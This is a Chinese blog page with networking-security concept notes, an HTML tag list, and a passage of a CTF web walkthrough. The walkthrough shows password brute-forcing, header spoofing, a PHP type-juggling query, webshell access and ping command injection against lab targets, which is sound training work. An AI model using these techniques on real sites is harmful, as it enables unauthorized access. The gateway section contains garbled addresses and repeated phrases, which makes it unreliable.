<p>  2 255.255.255.192 64 62</p>
<p>  3 255.255.255.224 32 30</p>
<p>  4 255.255.255.240 16 14</p>
<p>  5 255.255.255.248 8 6</p>
<p>  6 255.255.255.252 4 2</p>
<h2 id="三、网关"><a href="#三、网关" class="headerlink" title="三、网关"></a>三、网关</h2><p>   <font color=#ff0000 size=4><strong>定义：</strong></font>网关(Gateway)又称网间连接器、协议转换器。网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关的结构也和路由器类似，不同的是互连层。网关既可以用于广域网互连，也可以用于局域网互连。 网关是一种充当转换重任的计算机系统或设备。在使用不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同时，网关也可以提供过滤和安全功能。大多数网关运行在OSI 7层协议的顶层–应用层。 </p>
<p> <font color=#ff0000 size=4><strong>实质：</strong></font>网关实质上是一个网络通向其他网络的IP地址。比如说网络A和网络B，网络A为192.0.0.0<del>192.168.1.254,子网掩码为255.255.255.0;网络B的IP地址范围为“192.168.1.1</del>192.168.1.254”，子网掩码为“255,255,255,0，</p>
<p>“255.255.255.0”。在没有路由器的情况下，两个网路是不能进行TCP/IP，两个网络是不能进行TCP/IP通信的，即使那两个主机连在网络之间的通信，则必须要到过关。如果网络A的主机发现数据包的目的不在本地网络中，就把数据转发给它自己的网关，再由网关转发给网络B的网关，网路B的网关在转发给网络B的主机。</p>
<h1 id="IPS与IDS"><a href="#IPS与IDS" class="headerlink" title="IPS与IDS"></a>IPS与IDS</h1><h2 id="一、IPS"><a href="#一、IPS" class="headerlink" title="一、IPS"></a>一、IPS</h2><p><font color=#ff0000 size=4><strong>定义：</strong></font>入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。 入侵防御系统(Intrusion-prevention system)是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够及时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p>
<p><font color=#ff0000 size=4><strong>来源：</strong></font>在ISO/OSI网络层次模型(见OSI模型) 中，防火墙主要在第二到第四层起作用，它的作用在第四到第七层一般很微弱。而除病毒软件主要在第五到第七层起作用。为了弥补防火墙和除病毒软件二者在第四到第五层之间留下的空档，几年前，工业界已经有入侵侦查系统(IDS: Intrusion Detection System）投入使用。入侵侦查系统在发现异常情况后及时向网络安全管理人员或防火墙系统发出警报。可惜这时灾害往往已经形成。虽然，亡羊补牢，尤未为晚，但是，防卫机制最好应该是在危害形成之前先期起作用。随后应运而生的入侵响应系统(IRS: Intrusion Response Systems) 作为对入侵侦查系统的补充能够在发现入侵时，迅速作出反应，并自动采取阻止措施。而入侵预防系统则作为二者的进一步发展，汲取了二者的长处。</p>
<h2 id="二、IDS"><a href="#二、IDS" class="headerlink" title="二、IDS"></a>二、IDS</h2><p><font color=#ff0000 size=4><strong>定义：</strong></font>入侵检测系统（intrusion detection system，简称“IDS”）是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。 IDS最早出现在1980年4月。 1980年代中期，IDS逐渐发展成为入侵检测专家系统（IDES）。 1990年，IDS分化为基于网络的IDS和基于主机的IDS。后又出现分布式IDS。目前，IDS发展迅速，已有人宣称IDS可以完全取代防火墙。</p>
<p><font color=#ff0000 size=4><strong>简介：</strong></font>IDS是计算机的监视系统，它通过实时监视系统，一旦发现异常情况就发出警告。 [1]  以信息来源的不同和检测方法的差异分为几类：根据信息来源可分为基于主机IDS和基于网络的IDS，根据检测方法又可分为异常入侵检测和误用入侵检测。不同于防火墙，IDS入侵检测系统是一个监听设备，没有跨接在任何链路上，无须网络流量流经它便可以工作。因此，对IDS的部署，唯一的要求是：IDS应当挂接在所有所关注流量都必须流经的链路上。在这里，”所关注流量”指的是来自高危网络区域的访问流量和需要进行统计、监视的网络报文。在如今的网络拓扑中，已经很难找到以前的HUB式的共享介质冲突域的网络，绝大部分的网络区域都已经全面升级到交换式的网络结构。因此，IDS在交换式网络中的位置一般选择在尽可能靠近攻击源或者尽可能靠近受保护资源的位置。这些位置通常是：服务器区域的交换机上；Internet接入路由器之后的第一台交换机上；重点保护网段的局域网交换机上。</p>
<h1 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h1><p><font color=#ff0000 size=5><strong>定义：</strong></font>堡垒机，即在一个特定的网络环境下，为了保障网络和数据不受来自外部和内部用户的入侵和破坏，而运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</p>
<p><font color=#ff0000 size=5><strong>概述：</strong></font>其从功能上讲，它综合了核心系统运维和安全审计管控两大主干功能，从技术实现上讲，通过切断终端计算机对网络和服务器资源的直接访问，而采用协议代理的方式，接管了终端计算机对网络和服务器的访问。形象地说，终端计算机对目标的访问，均需要经过运维安全审计的翻译。打一个比方，运维安全审计扮演着看门者的工作，所有对网络设备和服务器的请求都要从这扇大门经过。因此运维安全审计能够拦截非法访问和恶意攻击，对不合法命令进行命令阻断，过滤掉所有对目标设备的非法访问行为，并对内部人员误操作和非法操作进行审计监控，以便事后责任追踪。<br>安全审计作为企业信息安全建设不可缺少的组成部分，逐渐受到用户的关注，是企业安全体系中的重要环节。同时，安全审计是事前预防、事中预警的有效风险控制手段，也是事后追溯的可靠证据来源。</p>
<p><font color=#ff0000 size=5><strong>功能：</strong></font></p>
<p><font color=#ff0000 size=4>登录功能</font></p>
<p>支持对X11、linux、unix、数据库、网络设备、安全设备等一系列授权账号进行密码的自动化周期更改，简化密码管理，让使用者无需记忆众多系统密码，即可实现自动登录目标设备，便捷安全。</p>
<p><font color=#ff0000 size=4>账号管理</font></p>
<p>设备支持统一账户管理策略，能够实现对所有服务器、网络设备、安全设备等账号进行集中管理，完成对账号整个生命周期的监控，并且可以对设备进行特殊角色设置如：审计巡检员、运维操作员、设备管理员等自定义设置，以满足审计需求</p>
<p><font color=#ff0000 size=4>身份认证</font></p>
<p>设备提供统一的认证接口，对用户进行认证，支持身份认证模式包括 动态口令、静态密码、硬件key 、生物特征等多种认证方式，设备具有灵活的定制接口，可以与其他第三方认证服务器之间结合；安全的认证模式，有效提高了认证的安全性和可靠性。</p>
<p><font color=#ff0000 size=4>资源授权</font></p>
<p>设备提供基于用户、目标设备、时间、协议类型IP、行为等要素实现细粒度的操作授权，最大限度保护用户资源的安全</p>
<p><font color=#ff0000 size=4>访问控制</font></p>
<p>设备支持对不同用户进行不同策略的制定，细粒度的访问控制能够最大限度的保护用户资源的安全，严防非法、越权访问事件的发生。</p>
<p><font color=#ff0000 size=4>操作审计</font></p>
<p>设备能够对字符串、图形、文件传输、数据库等全程操作行为审计；通过设备录像方式实时监控运维人员对操作系统、安全设备、网络设备、数据库等进行的各种操作，对违规行为进行事中控制。对终端指令信息能够进行精确搜索，进行录像精确定位。</p>
<h1 id="DMZ区"><a href="#DMZ区" class="headerlink" title="DMZ区"></a>DMZ区</h1><p><font color=#ff0000 size=4><strong>概念：</strong></font>DMZ 是英文“Demilitarized Zone”的缩写，中文名称为“隔离区”， 与军事区和信任区相对应，也称“非军事化区”，是为了解决外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。作用是把单位的 FTP服务器、E-Mail服务器等允许外部访问的服务器单独部署在此区域，使整个需要保护的内部网络接在信任区后，不允许任何外部网络的直接访问，实现内外网分离，满足用户的安全需求。</p>
<pre><code>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。DMZ 区是信息安全纵深防护体系的第一道屏障，在企事业单位整体信息安全防护体系中具有举足轻重的作用。</code></pre>
<p>针对不同资源提供不同安全级别的保护，就可以考虑 构建一个 DMZ 区域。如图所示，我们可以看到网络被划分为三个区域：安全级别最高的 LAN Area（内网），安全级别中等的 DMZ 区域和安全级别最低的 Internet 区域（外网）。右图是一个典型的 DMZ 区的构建图，用户将核心的、重要的，只为内部网络用户提供服务的服务器部署在内网，将 WEB 服务器、E-Mail 服务器、FTP 服务器等需要为内部和外部网络同时提供服务的服务器放置到防火墙后的 DMZ 区内。通过合理的策略规划，使 DMZ 中服务器既免受到来自外网络的入侵和破坏，也不会对内网中的机密信息造成影响。DMZ 服务区好比一道屏障，在其中放置外网服务器，在为外网用户提供服务的同时也有效地保障了内部网络的安全。<br><img src="https://bkimg.cdn.bcebos.com/pic/1f178a82b9014a908602f531a7773912b31bee7a?x-bce-process=image/resize,m_lfit,w_220,limit_1"></p>
<p><font color=#ff0000 size=4><strong>作用：</strong></font>在实际的运用中，某些主机需要对外提供服务，为了更好地提供服务，同时又要有效地保护内部网络的安全，将这些需要对外开放的主机与内部的众多网络设备分隔开来，根据不同的需要，有针对性地采取相应的隔离措施，这样便能在对外提供友好的服务的同时最大限度地保护了内部网络。针对不同资源提供不同安全级别的保护，可以构建一个DMZ区域，DMZ可以为主机环境提供网络级的保护，能减少为不信任客户提供服务而引发的危险，是放置公共信息的最佳位置。在一个非DMZ系统中，内部网络和主机的安全通常并不如人们想象的那样坚固，提供给Internet的服务产生了许多漏洞，使其他主机极易受到攻击。但是，通过配置DMZ，我们可以将需要保护的Web应用程序服务器和数据库系统放在内网中，把没有包含敏感数据、担当代理数据访问职责的主机放置于DMZ中，这样就为应用系统安全提供了保障。DMZ使包含重要数据的内部系统免于直接暴露给外部网络而受到攻击，攻击者即使初步入侵成功，还要面临DMZ设置的新的障碍。</p>
<h1 id="VMware三种连接方式详解"><a href="#VMware三种连接方式详解" class="headerlink" title="VMware三种连接方式详解"></a>VMware三种连接方式详解</h1><h2 id="一、桥接模式"><a href="#一、桥接模式" class="headerlink" title="一、桥接模式"></a>一、桥接模式</h2><p>桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。</p>
<h2 id="二、NAT模式"><a href="#二、NAT模式" class="headerlink" title="二、NAT模式"></a>二、NAT模式</h2><p>NAT模式也称为地址转换模式，在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。那么我们会觉得很奇怪，为什么需要虚拟网卡VMware Network Adapter VMnet8呢？原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。在之后的设置步骤中，我们可以加以验证。</p>
<h2 id="三、仅主机模式"><a href="#三、仅主机模式" class="headerlink" title="三、仅主机模式"></a>三、仅主机模式</h2><p>仅主机模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，主机模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/30/dingyi/" data-id="ckia6qyz400041sutf1feeyfs" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E5%AE%89%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E6%A6%82%E5%BF%B5/" rel="tag">网安方向部分概念</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-htmlmark" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/28/htmlmark/" class="article-date">
  <time datetime="2020-11-28T14:20:07.000Z" itemprop="datePublished">2020-11-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/28/htmlmark/">HTML标签</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="超文本标记语言简称HTML，标记标签通常记为HTML标签。"><a href="#超文本标记语言简称HTML，标记标签通常记为HTML标签。" class="headerlink" title="超文本标记语言简称HTML，标记标签通常记为HTML标签。"></a>超文本标记语言简称HTML，标记标签通常记为HTML标签。</h3><h3 id="注意：HTML标签不分大小写"><a href="#注意：HTML标签不分大小写" class="headerlink" title="注意：HTML标签不分大小写"></a>注意：HTML标签不分大小写</h3><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><hr>
<p>1.由尖括号包围的关键词，比如 &lt; html &gt;</p>
<p>2.通常是成对出现的，比如 &lt;div&gt; 和 &lt;/div&gt;</p>
<p>3.标签对中的第一个标签是开始标签，第二个标签是结束标签;</p>
<p>4.开始和结束标签也被称为开放标签和闭合标签。</p>
<p>5.也有单独呈现的标签，如:&lt;img src=”百度百科.jpg” /&gt;等。</p>
<p>6.一般成对出现的标签，其内容在两个标签中间。单独呈现的标签，则在标签属性中赋值。如&lt;h1&gt;标题&lt;/h1&gt;和 &lt;input type=”text” value=”按钮” /&gt;。</p>
<p>7.网页的内容需在&lt;html&gt;标签中，标题、字符格式、语言、兼容性、关键字、描述等信息显示在&lt;head&gt;标签中，而网页需展示的内容需嵌套在&lt;body&gt;标签中。某些时候不按标准书写代码虽然可以正常显示，但是作为职业素养，还是应该养成正规编写习惯。</p>
<hr>
<h1 id="常见的HTML标签"><a href="#常见的HTML标签" class="headerlink" title="常见的HTML标签"></a>常见的HTML标签</h1><h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><p>&lt;html&gt;…&lt;/html&gt;      定义 HTML 文档</p>
<p>&lt;head&gt;…&lt;/head&gt;   文档的信息</p>
<p>&lt;meta&gt;                    HTML 文档的元信息</p>
<p>&lt;title&gt;…&lt;/title&gt;        文档的标题</p>
<p>&lt;link&gt;                      文档与外部资源的关系</p>
<p>&lt;style&gt;…&lt;/style&gt;    文档的样式信息</p>
<p>&lt;body&gt;…&lt;/body&gt;   可见的页面内容</p>
<p>&lt;!–…–&gt;                 注释</p>
<h2 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h2><p>&lt;h1&gt;…&lt;/h1&gt;               标题字大小（h1~h6）</p>
<p>&lt;b&gt;…&lt;/b&gt;                   粗体字</p>
<p>&lt;strong&gt;…&lt;/strong&gt;   粗体字(强调) </p>
<p>&lt;i&gt;…&lt;/i&gt;                      斜体字 </p>
<p>&lt;em&gt;…&lt;/em&gt;              斜体字(强调)</p>
<p>&lt;center&gt;…&lt;/center&gt;   居中文本</p>
<p>&lt;ul&gt;…&lt;/ul&gt;                 无序列表 </p>
<p>&lt;ol&gt;…&lt;/ol&gt;                 有序列表</p>
<p>&lt;li&gt;…&lt;/li&gt;                    列表项目</p>
<p>&lt;a href=”…”&gt;…&lt;/a&gt;    超链接</p>
<p>&lt;font&gt;                         定义文本字体尺寸、颜色、大小</p>
<p>&lt;sub&gt;                         下标</p>
<p>&lt;sup&gt;                         上标</p>
<p>&lt;br&gt;                           换行</p>
<p>&lt;p&gt;                            段落</p>
<h2 id="图形"><a href="#图形" class="headerlink" title="图形"></a>图形</h2><p>&lt;img src=’”…”&gt;   定义图像</p>
<p>&lt;hr&gt;                   水平线</p>
<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>&lt;table&gt;…&lt;/table&gt;   定义表格</p>
<p>&lt;th&gt;…&lt;/th&gt;            定义表格中的表头单元格</p>
<p>&lt;tr&gt;…&lt;/tr&gt;             定义表格中的行</p>
<p>&lt;td&gt;…&lt;/td&gt;           定义表格中的单元</p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>&lt;form&gt;…&lt;/form&gt;    定义供用户输入的 HTML 表单</p>
<p>&lt;frame&gt;                 定义框架集的窗口或框架</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/28/htmlmark/" data-id="ckia6u7he000054utaj6zgf8k" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTML%E6%A0%87%E7%AD%BE/" rel="tag">HTML标签</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-ctfweb" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/25/ctfweb/" class="article-date">
  <time datetime="2020-11-25T14:13:48.000Z" itemprop="datePublished">2020-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/25/ctfweb/">ctf-web</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="#%E7%AC%AC%E4%B8%80%E9%A2%98-view-source">第一题-view source</a></p>
<p><a href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-robots">第二题-robots</a></p>
<p><a href="#%E7%AC%AC%E4%B8%89%E9%A2%98-backup">第三题-backup</a></p>
<p><a href="#%E7%AC%AC%E5%9B%9B%E9%A2%98cookie">第四题cookie</a></p>
<p><a href="#%E7%AC%AC%E4%BA%94%E9%A2%98-disabled_button">第五题-disabled_button</a></p>
<p><a href="%E7%AC%AC%E5%85%AD%E9%A2%98-weak_auth">第六题-weak auth</a></p>
<p><a href="#%E7%AC%AC%E4%B8%83%E9%A2%98-simple_php">第七题-simple_php</a></p>
<p><a href="#%E7%AC%AC%E5%85%AB%E9%A2%98-get_post">第八题-get post</a></p>
<p><a href="#%E7%AC%AC%E4%B9%9D%E9%A2%98-xff_referer">第九题-xff_referer</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E9%A2%98-webshell">第十题-webshell</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E9%A2%98-command_execution">第十一题-command_execution</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E9%A2%98-simple_js">第十二题-simple_js</a></p>
<h1 id="第一题-view-source"><a href="#第一题-view-source" class="headerlink" title="第一题-view-source"></a>第一题-view-source</h1><p>打开题目所给网页如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEBe333e3bb898cdc1e18865bbc78a64f88?method=download&shareKey=cc1458c17c1fe1f54b35889e6d1c42e3"><br>查看源代码可使用view-source：<a target="_blank" rel="noopener" href="http://220.249.52.133:32303/">http://220.249.52.133:32303/</a><br>即可得到<br><img src="https://note.youdao.com/yws/api/personal/file/WEB6de6171b851db01fd9eb9c468b523396?method=download&shareKey=941f6adc958bc010a42bbf8b3d583f5a"><br>第十七行中蓝色部分即为所需flag</p>
<h1 id="第二题-robots"><a href="#第二题-robots" class="headerlink" title="第二题-robots"></a>第二题-robots</h1><p>打开题目所给网页如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB5f020626ef2cde26c3e832184653acb4?method=download&shareKey=6b4becaef2f5bbfda5f0bfe33c2cd38f"><br>对网页使用robots协议输入<a target="_blank" rel="noopener" href="http://220.249.52.133:31344/robots.txt">http://220.249.52.133:31344/robots.txt</a></p>
<p>得到文本内容<br><img src="https://note.youdao.com/yws/api/personal/file/WEB500d33567f4d1153bef816f473e0574b?method=download&shareKey=9e8cbd7d8efd2b64ae375bebbd7c568d"><br>第三行的f1ag_1s_h3re.php为打开该目录下PHP格式文件<br><img src="https://note.youdao.com/yws/api/personal/file/WEB3d5aaed235a6f834a2a4c2f522058e92?method=download&shareKey=c499f49f2efd1ca6cc3d15f714c29467"><br>得到的内容极为flag</p>
<h1 id="第三题-backup"><a href="#第三题-backup" class="headerlink" title="第三题-backup"></a>第三题-backup</h1><p>打开题目所给网页如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf25bdad3f93c3b2134497ca2dc2088ee?method=download&shareKey=5c815eb90b47ecbd32cbd6716045803b"><br>查询得知index.php的备份文件名为index.php.bak</p>
<p>输入220.249.52.133:49804/index.php.bak会弹出如下界面<br><img src="https://note.youdao.com/yws/api/personal/file/WEB013115cc9ea0f369780d40f4f55d148d?method=download&shareKey=f7d3624510c1c01379da7081d54f6aa9"><br>选择以记事本打开后会得到答案所在，如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB76ed2c24a84245ab889edcff5904ea45?method=download&shareKey=a512c6cf24f1fb023ceb23e317f9e1b1"><br>输入flag即为答案</p>
<h1 id="第四题cookie"><a href="#第四题cookie" class="headerlink" title="第四题cookie"></a>第四题cookie</h1><p>打开题目所给网页如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9d697598decf6b5d46cc647c2c93b4d3?method=download&shareKey=475ed4b19dc25c87d408fb26fb9ab783"><br>使用火狐cookie查询所存放的地址<br><img src="https://note.youdao.com/yws/api/personal/file/WEB893690cb8bf23bec48e3667a8e50c4e2?method=download&shareKey=ceb9af2cbcfbe7a90a5bd7d0c23113f0"><br>得到在cookie.php目录下</p>
<p>输入<a target="_blank" rel="noopener" href="http://220.249.52.133:56288/cookie.php%E5%BE%97%E5%88%B0">http://220.249.52.133:56288/cookie.php得到</a><br><img src="https://note.youdao.com/yws/api/personal/file/WEBecaec77db6e6b786579080390cd7cba2?method=download&shareKey=7da176a1cefc0999b0c0931d07674ecd"><br>使用hackbar查询回复<br><img src="https://note.youdao.com/yws/api/personal/file/WEB1524d88bbbb8224f0344da34cc2d9c78?method=download&shareKey=2a7e9af67793477169b5c6d573ad66c2"><br>在右边的响应里即可得到flag</p>
<h1 id="第五题-disabled-button"><a href="#第五题-disabled-button" class="headerlink" title="第五题-disabled_button"></a>第五题-disabled_button</h1><p><img src="https://note.youdao.com/yws/api/personal/file/WEBf0f3698668fe4cddb021ca4b2a12144f?method=download&shareKey=92b77306e73b50968ebd620c40e25abc"><br>打开后发现flag按钮无法按下</p>
<p>使用hackbar对页面查看发现按钮为disabled<br><img src="https://note.youdao.com/yws/api/personal/file/WEB473f834d3cefb71a8b0ab5471b54480d?method=download&shareKey=a2973250f438b5ace5a243d0b587300b"><br>将disabled改为abled后发现按钮可以按了<br><img src="https://note.youdao.com/yws/api/personal/file/WEB46613771bbd9fd701a2106e22a23b12e?method=download&shareKey=4fec3645e5c2724869affce2aa2f6e8a"><br>显示即为所求flag</p>
<h1 id="第六题-weak-auth"><a href="#第六题-weak-auth" class="headerlink" title="第六题-weak_auth"></a>第六题-weak_auth</h1><p>打开题目所给网页如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9bfcfa7f93c15e689e11611b33d5d2e3?method=download&shareKey=80b49721820217e2cb536ff54f70917a"><br>经过试验发现login为admin<br><img src="https://note.youdao.com/yws/api/personal/file/WEB643cabf4bd0009a0fb4766ef55ff1664?method=download&shareKey=e86327a8deba2244e5dc76afaa3c091f"><br>使用login为admin，password为123试验，发现登陆错误</p>
<p>使用burpsuit抓包<br><img src="https://note.youdao.com/yws/api/personal/file/WEB321651a9753d3c3243a68ef08b71a5b0?method=download&shareKey=eb10808274184a594a9103750590987d"><br>之后发送到intruder模块进行爆破对123添加变量，加载字典，进行爆破<br><img src="https://note.youdao.com/yws/api/personal/file/WEBb3e9b51e44f0cffd16d59c9b559319f3?method=download&shareKey=e6da53290b68c5b7ff6d3d92b2fa50ed"><br><img src="https://note.youdao.com/yws/api/personal/file/WEB727bea2df54fb3c6d4cf411ef9905fa3?method=download&shareKey=1be8663d250fc82b989d785122cb6a3b"><br>发现密码为123456时长度不同，所以密码为123456，<br>输入密码得到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB7068ac84b584ce5e3147e90dd1c40a46?method=download&shareKey=83dcef8a5152e8a0aa41953839ed4d13"></p>
<h1 id="第七题-simple-php"><a href="#第七题-simple-php" class="headerlink" title="第七题-simple_php"></a>第七题-simple_php</h1><p>打开题目所给网页如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB416c10902f35d1db27679f6967c36c37?method=download&shareKey=2d4408b5dd967e5c7a139cb883c1943a"><br>经过分析要求一$a==0 and $a意思为a=0且a为真<br>因为PHP是弱语言a为字符型转为数字型a值为0为真<br>即a==0为真。要求二为b为字符型且要大于1234.</p>
<p>所以输入?a=a&amp;b=2345a,即得到输出的flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB6cfa2ada84eb7688a1056f55edc6fd50?method=download&shareKey=308f34c6114a17b4cce7b67b02a60a38"></p>
<h1 id="第八题-get-post"><a href="#第八题-get-post" class="headerlink" title="第八题-get_post"></a>第八题-get_post</h1><p>打开题目所给网页，如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9f4a6b69c817a725d4819c287e8af8d7?method=download&shareKey=3a821da06fe41de317ca12ff0c4b6e0e"><br>用get方式提交a=1需要输入?a=1如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEBbbb2b91b0d52ab4cda298f63f20a1057?method=download&shareKey=c5e85ddc5b3bc7bff9116ef802036b62"><br>用post方式提交变量b=2，即打开hackbar，点击hackbar，勾选post data,将b=2提交，点击execute即可得到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9001b53456e207a0bd7365981132e7eb?method=download&shareKey=cd959d5e7200aaf31d680a4e670765b0"></p>
<h1 id="第九题-xff-referer"><a href="#第九题-xff-referer" class="headerlink" title="第九题-xff_referer"></a>第九题-xff_referer</h1><p>打开题目所给网页，如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEB4a18b08efdaf3013b56eba291711b30a?method=download&shareKey=3a83327a0b52a63a0cfe142a313c53ef"><br>使用burpsuit进行抓包<br><img src="https://note.youdao.com/yws/api/personal/file/WEBea4cc0c23953c6c6e6fad4818d08092d?method=download&shareKey=6bc27310114a9b5c8db60f9b588f430f"><br>添加X-Forwarded-For协议<br><img src="https://note.youdao.com/yws/api/personal/file/WEBef16d42d099dd4efd525945eac482c12?method=download&shareKey=e568add994694342455c896ef30980ac"><br>点击forward进行下一步，获知必须来自<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a><br><img src="https://note.youdao.com/yws/api/personal/file/WEBc4ee150411e8f3ea774afd3f6abeb6b6?method=download&shareKey=96e8ae4b8e1c0c8f483fe40adb743df5"><br>对burp同时提交X-Forwarded-For和Referer<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf4199ebd188c14f2de0e7165d85e79b7?method=download&shareKey=8ca8a5322a11686ed863232dc61eed52"><br>即可获得flag</p>
<h1 id="第十题-webshell"><a href="#第十题-webshell" class="headerlink" title="第十题-webshell"></a>第十题-webshell</h1><p>打开题目所给网页，如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEBb05467c34c6fcf45d20dd0c49015ba1e?method=download&shareKey=aa97c568f32a779157a26c382ff530a3"><br>得知文件为shell类型，使用蚁剑添加URL地址及连接密码<br><img src="https://note.youdao.com/yws/api/personal/file/WEBc15bf1a942f86f27f6a0020590ca0cd6?method=download&shareKey=1e02c8431bfceaef4f0683718beb8b3f"><br>添加成功后如图<br><img src="https://note.youdao.com/yws/api/personal/file/WEBe69786103baa8f76fc700179cf4f63ee?method=download&shareKey=4a2e9e339cf8be96792b7156e570e91c"><br>点开所添加内容可发现flag所在的txt文件<br><img src="https://note.youdao.com/yws/api/personal/file/WEB512a03abf4d307c51dcbb7d555f11d6e?method=download&shareKey=02962a1840a78f9501b68c04794e7cb4"><br>即得到所需flag</p>
<h1 id="第十一题-command-execution"><a href="#第十一题-command-execution" class="headerlink" title="第十一题-command_execution"></a>第十一题-command_execution</h1><p>打开题目所给网页，ping：127.0.0.1，查看<br><img src="https://note.youdao.com/yws/api/personal/file/WEB641662f2a877e93f989ab4def9f15f81?method=download&shareKey=5d38d293d31cc68fbb7127663d38a396"><br>使用ls查看内容<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9b05e7d6453cd2841c38e69ede86f985?method=download&shareKey=7e75050db0df2a10751be8660b01bff4"><br>使用find命令查看目录下txt型文件<br><img src="https://note.youdao.com/yws/api/personal/file/WEB0a2f02130b85b6a8ba1548a2d9930697?method=download&shareKey=51e52f50780dd74300839b2bd1e1e1bf"><br>发现flag所在文件后，使用cat命令抓出<br><img src="https://note.youdao.com/yws/api/personal/file/WEBeeb5de7ad3c594ebca00405991817c64?method=download&shareKey=1da50a4f1702c3dfb496e88467586bed"></p>
<h1 id="第十二题-simple-js"><a href="#第十二题-simple-js" class="headerlink" title="第十二题-simple_js"></a>第十二题-simple_js</h1><p>打开所给网页，任意输入一个密码，进入网页查看源代码<br><img src="https://note.youdao.com/yws/api/personal/file/WEB8b40bd90cd9258984c2c767172f4cf1f?method=download&shareKey=88cc2f519b5c8bdc22ecc1e3fbe6d719"><br>经分析可知无论输入什么都显示密码错误。<br>图中String<a href="dechiffre(%22%5Cx35%5Cx35%5Cx2c%5Cx35%5Cx36%5Cx2c%5Cx35%5Cx34%5Cx2c%5Cx37%5Cx39%5Cx2c%5Cx31%5Cx31%5Cx35%5Cx2c%5Cx36%5Cx39%5Cx2c%5Cx31%5Cx31%5Cx34%5Cx2c%5Cx31%5Cx31%5Cx36%5Cx2c%5Cx31%5Cx30%5Cx37%5Cx2c%5Cx34%5Cx39%5Cx2c%5Cx35%5Cx30%22)">“fromCharCode”</a>;的内容中将\x均换为%进行解码<br><img 